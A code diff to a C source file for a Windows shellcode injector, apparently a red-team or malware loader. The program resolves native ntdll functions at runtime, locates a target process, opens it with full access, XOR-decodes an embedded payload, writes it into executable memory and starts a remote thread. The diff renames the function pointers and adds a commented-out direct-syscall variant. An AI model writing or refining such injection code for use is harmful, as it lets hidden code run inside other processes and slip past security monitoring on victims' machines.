@@ -35,23 +35,23 @@ typedef NTSTATUS (NTAPI* pfnRtlCreateUserThread)(HANDLE, PSECURITY_DESCRIPTOR, B
 typedef NTSTATUS (NTAPI* pfnNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
 // Declare global pointers to functions
-pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;
-pfnNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
-pfnNtOpenProcess NtOpenProcess = NULL;
-pfnNtClose NtClose = NULL;
-pfnRtlCreateUserThread RtlCreateUserThread = NULL;
-pfnNtQuerySystemInformation NtQuerySystemInformation = NULL;
+pfnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
+pfnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
+pfnNtOpenProcess pNtOpenProcess = NULL;
+pfnNtClose pNtClose = NULL;
+pfnRtlCreateUserThread pRtlCreateUserThread = NULL;
+pfnNtQuerySystemInformation pNtQuerySystemInformation = NULL;
 
 // Function to dynamically load NTAPIs
 void LoadAPIs() {
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
 
-    NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    NtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
-    NtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
-    NtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
-    RtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
-    NtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+    pNtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
+    pNtWriteVirtualMemory = (pfnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
+    pNtOpenProcess = (pfnNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
+    pNtClose = (pfnNtClose)GetProcAddress(hNtdll, "NtClose");
+    pRtlCreateUserThread = (pfnRtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
+    pNtQuerySystemInformation = (pfnNtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
 }
 
 // XOR each byte of the buffer with a given key
@@ -61,23 +61,49 @@ void XOR(unsigned char* data, size_t data_len) {
     }
 }
 
+
+/*
+
+    PVOID buffer = NULL;
+    ULONG buffer_size = 0x10000;
+    ULONG needed_size = 0;
+
+    buffer = malloc(buffer_size);
+    NTSTATUS status;
+
+    while ((status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
+        buffer_size = needed_size;
+        buffer = realloc(buffer, buffer_size);
+    }
+
+    if (!NT_SUCCESS(status)) {
+        printf("Failed to query process information.\n");
+        free(buffer);
+        return 0;
+    }
+
+    SYSTEM_PROCESS_INFORMATION* spi = (SYSTEM_PROCESS_INFORMATION*)buffer;
+    int pid = 0;
+
+*/
+
+
 int FindTarget(const wchar_t* target_process) {
 
-    buffer = malloc(bufferSize);
+    PVOID buffer = NULL;
+    ULONG buffer_size = 0x10000;
+    ULONG needed_size = 0;
+
+    buffer = malloc(buffer_size);
     if (!buffer) {
         return 1;
     }
 
     NTSTATUS status;
     // Reallocate buffer as needed
-    while ((status = NtQuerySystemInformation(SystemProcessInformation, buffer, bufferSize, &neededSize)) == STATUS_INFO_LENGTH_MISMATCH) {
-        bufferSize = neededSize;
-        PVOID tempBuffer = realloc(buffer, bufferSize);
-        if (!tempBuffer) {
-            free(buffer);
-            return 1;
-        }
-        buffer = tempBuffer;
+    while ((status = pNtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
+        buffer_size = needed_size;
+        buffer = realloc(buffer, buffer_size);
     }
 
     if (!NT_SUCCESS(status)) {
@@ -107,15 +133,15 @@ int Inject(HANDLE hProc, unsigned char* buf, unsigned int buf_len) {
     SIZE_T ulSize = buf_len;
     NTSTATUS status;
 
-    status = NtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &ulSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    status = pNtAllocateVirtualMemory(hProc, &pRemoteCode, 0, &ulSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (!NT_SUCCESS(status)) return -1;
 
     ULONG bytesWritten;
-    status = NtWriteVirtualMemory(hProc, pRemoteCode, buf, buf_len, &bytesWritten);
+    status = pNtWriteVirtualMemory(hProc, pRemoteCode, buf, buf_len, &bytesWritten);
     if (!NT_SUCCESS(status) || bytesWritten != buf_len) return -1;
 
     HANDLE hThread = NULL;
-    status = RtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, pRemoteCode, NULL, &hThread, NULL);
+    status = pRtlCreateUserThread(hProc, NULL, FALSE, 0, NULL, NULL, pRemoteCode, NULL, &hThread, NULL);
     if (!NT_SUCCESS(status) || hThread == NULL) return -1;
 
     WaitForSingleObject(hThread, INFINITE);
@@ -141,7 +167,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     LoadAPIs();
     // Check initialization
-    if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtOpenProcess || !NtClose || !RtlCreateUserThread || !NtQuerySystemInformation) return -1; 
+    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtOpenProcess || !pNtClose || !pRtlCreateUserThread || !pNtQuerySystemInformation) return -1; 
 
     pid = FindTarget(target_process);
 
@@ -155,12 +181,12 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);
 
-    NTSTATUS status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);
+    NTSTATUS status = pNtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);
 
     if (status == STATUS_SUCCESS) {
         XOR(buf, sizeof(buf));
         Inject(hProc, buf, sizeof(buf));
-        NtClose(hProc);
+        pNtClose(hProc);
     }
 
     return 0;
